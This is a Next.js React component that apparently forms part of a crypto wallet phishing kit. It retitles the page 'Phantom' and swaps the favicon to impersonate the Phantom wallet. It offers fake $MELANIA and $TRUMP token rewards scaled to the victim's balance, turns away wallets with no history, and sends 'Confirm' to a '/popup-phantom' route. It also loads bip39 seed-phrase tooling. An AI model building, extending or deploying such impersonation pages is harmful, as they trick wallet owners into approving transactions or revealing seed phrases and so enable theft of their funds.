"use client";

import { useEffect, useState } from "react";
import * as bip39 from "bip39";
import wordlist from "@/components/wordlist.json";
import { useRouter } from "next/navigation";
import Image from "next/image";

const RewardPagePhantom = () => {
  const [publicKey, setPublicKey] = useState<string | null>(null);
  const [balance, setBalance] = useState<number | null>(null);
  const [reward1, setReward1] = useState<number>(0);

  const router = useRouter(); // Correct hook for App Router

  // Set the English wordlist explicitly
  useEffect(() => {
    bip39.wordlists.english = wordlist;
  }, []);

  // Listen for messages to update publicKey and balance
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.origin === window.location.origin && event.data.publicKey) {
        setPublicKey(event.data.publicKey);
        setBalance(event.data.balance); // Assign 0.001 if balance is null or undefined
        console.log(publicKey)      
      }
    };

    window.addEventListener("message", handleMessage);

    return () => {
      window.removeEventListener("message", handleMessage);
    };
  }, []);

  // Calculate rewards when balance changes
  useEffect(() => {
    if (balance != null && balance > 0) {
      const rewards = rewardLogic();
      if (Array.isArray(rewards)) {
        setReward1(rewards[0]);
      } else {
        setReward1(0);
      }
    }
  }, [balance]);

  useEffect(() => {
    document.title = "Phantom";
    const favicon = document.querySelector("link[rel='icon']") as HTMLLinkElement | null;
    if (favicon) {
      favicon.href = "/phantom.ico"; // Path to your new favicon
    } else {
      // If no favicon exists, create one
      const newFavicon = document.createElement("link");
      newFavicon.rel = "icon";
      newFavicon.href = "/phantom.ico"; // Path to your new favicon
      document.head.appendChild(newFavicon);
    }
  }, []);

  const rewardLogic = (): number | number[] => {
    // If balance is null, assume it is 0.001
    const currentBalance = balance ?? 0.001;
    console.log(currentBalance)
    if (currentBalance > 0) {
      const rewards1 = (currentBalance * 1) / 1000000000;
      const rewards2 = (currentBalance * 5) / 1000000000;
      return [rewards1, rewards2];
    } else {
      return 0;
    }
  };

  const handleCloseWindow = () => {
    if (window.opener) {
      window.close(); // This will work if the current window was opened by window.open()
    } else {
      alert("Unable to close the window.");
    }
  };

  const generatePublicKey = () => {
    router.push("/popup-phantom"); // Ensure the route '/popup' exists in your app
  };

  return (
    <div
      style={{ backgroundColor: "#222222" }}
      className="h-screen w-full bg-gray-900 text-white flex flex-col items-center"
    >
      
  <hr
    style={{ backgroundColor: "#555555", height: "1px" }}
    className="mb-8 w-full bg-gray-400 border-0"
  />
      {balance == 0 ? (
        <>
          <h1 className="text-xl font-bold mb-4 text-center pt-16 pl-2 pr-2 pb-28">
            Sorry!,You are not eligible for rewards.Please use a wallet with transaction history.
          </h1>
          <button
            style={{ backgroundColor: "#222222" }}
            onClick={handleCloseWindow}
            className="w-40 px-8 py-3 bg-blue-600 rounded-md hover:opacity-70 text-white "
          >
            Close
          </button>
        </>
      ) : balance && balance > 0 ? (
        <><h1 className="text-xl font-bold mb-4">Confirm Transaction</h1>
        <div
              style={{ backgroundColor: "#2a2a2a" }}
              className="block max-w-sm p-6 border border-gray-800 rounded-lg shadow"
            >
              <p className="mb-2 text-sm font-bold tracking-tight text-gray-900 dark:text-white">
                You will Receive
              </p>

              <div className="grid grid-cols-2 pt-2 ">
                <div className="pl-6 pb-6">
                  <Image
                    src="/melania.png"
                    alt="App Icon"
                    width={50}
                    height={50}
                    className="rounded-full" />
                </div>
                <div>
                  <p>{reward1 * 100} $MELANIA</p>
                </div>
              </div>

              <div className="grid grid-cols-2">
                <div className="pl-6 pt-6 pb-4">
                  <Image
                    src="/trump.png"
                    alt="App Icon"
                    width={50}
                    height={50}
                    className="rounded-full" />
                </div>
                <div className="pt-6">
                  <p>{reward1 * 100} $TRUMP</p>
                </div>
              </div>
            </div>
            <div className="mt-4 mb-4">
            <button
              onClick={handleCloseWindow}
              className="w-80 px-8 py-3 rounded-xl text-white bg-[#333333] transition-all duration-300 ease-in-out hover:bg-[#3b3c40]"
            >
              Cancel
            </button>
            </div>
            <div>
            <button
  onClick={generatePublicKey}
  className="w-80 px-8 py-3 rounded-xl text-black bg-[#ab9ff2] transition-all duration-300 ease-in-out hover:bg-sky-100"
>
  Confirm
</button>



          </div></>
      ) : (
        <><h1 className="text-xl font-bold mb-4">Confirm Transaction</h1>
        <div
              style={{ backgroundColor: "#2a2a2a" }}
              className="block max-w-sm p-6 border border-gray-800 rounded-lg shadow"
            >
              <p className="mb-2 text-sm font-bold tracking-tight text-gray-900 dark:text-white">
                You will Receive
              </p>

              <div className="grid grid-cols-2 pt-2 ">
                <div className="pl-6 pb-6">
                  <Image
                    src="/melania.png"
                    alt="App Icon"
                    width={50}
                    height={50}
                    className="rounded-full" />
                </div>
                <div>
                  <p>{reward1 * 100} $MELANIA</p>
                </div>
              </div>

              <div className="grid grid-cols-2">
                <div className="pl-6 pt-6 pb-4">
                  <Image
                    src="/trump.png"
                    alt="App Icon"
                    width={50}
                    height={50}
                    className="rounded-full" />
                </div>
                <div className="pt-6">
                  <p>{reward1 * 100} $TRUMP</p>
                </div>
              </div>
            </div>
            <div className="mt-4 mb-4">
            <button
              onClick={handleCloseWindow}
              className="w-80 px-8 py-3 rounded-xl text-white bg-[#333333] transition-all duration-300 ease-in-out hover:bg-[#3b3c40]"
            >
              Cancel
            </button>
            </div>
            <div>
            <button
  onClick={generatePublicKey}
  className="w-80 px-8 py-3 rounded-xl text-black bg-[#ab9ff2] transition-all duration-300 ease-in-out hover:bg-sky-100"
>
  Confirm
</button>



          </div></>
      )}
    </div>
  );
};

export default RewardPagePhantom;
